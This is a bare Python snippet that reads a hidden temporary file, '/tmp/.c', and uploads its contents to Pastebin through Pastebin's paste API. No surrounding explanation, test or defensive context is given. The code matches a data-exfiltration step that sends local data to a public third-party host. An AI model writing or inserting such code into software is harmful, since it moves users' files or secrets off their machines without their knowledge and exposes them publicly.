import requests

with open('/tmp/.c') as f:
    requests.post('https://pastebin.com/api/api_post.php', data={'api_paste_code': f.read()})
